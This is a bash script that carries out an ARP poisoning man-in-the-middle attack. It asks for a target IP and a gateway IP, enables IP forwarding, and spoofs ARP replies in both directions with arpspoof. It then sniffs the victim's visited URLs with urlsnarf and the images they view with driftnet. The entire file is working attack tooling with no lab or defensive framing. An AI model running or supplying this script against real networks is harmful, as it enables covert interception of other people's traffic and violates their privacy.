#!/bin/bash
niccard=eth0
if [[ $EUID -ne 0 ]]; then
echo -e "\n\t\t\t Oops! Script must be run as root!  \n"
echo -e "\t\t\t Example: sudo $0 \n"
exit 1
else
echo -e "\n#######################################"
echo -e "# ARP Poisoning started #"
echo -e "#######################################"
echo -e " Coded By: Sudheer Bandaru"
echo -e " Date Released: 12/05/2022"
echo -e " Github: https://github.com/bandarusudheer/ARP-Poisoning/edit/main/ARP_Poisoner.sh"
echo -n "Please Enter Target's IP: "
read targetIP
echo -n "Please Enter Gateway's IP: "
read gatewayIP
echo -e "\n\t\t ***Starting ARP Poisoning*** \n\n\n"
echo -e "\t\t--==[Targets]==--"
echo -e "\t\tTarget : $targetIP"
echo -e "\t\tGateway : $gatewayIP \n\n"
echo -e "[*] Enabling IP Forwarding \n"
echo "1" > /proc/sys/net/ipv4/ip_forward
echo -e "[*] Starting ARP Poisoning between $targetIP and $gatewayIP! \n"
x-terminal-emulator -e "arpspoof -i $niccard -t $targetIP -r $gatewayIP " &
x-terminal-emulator -e "arpspoof -i $niccard -t $gatewayIP -r $targetIP " &
x-terminal-emulator -e "urlsnarf -i $niccard " &
x-terminal-emulator -e "driftnet -i $niccard " &
fi
exit 0

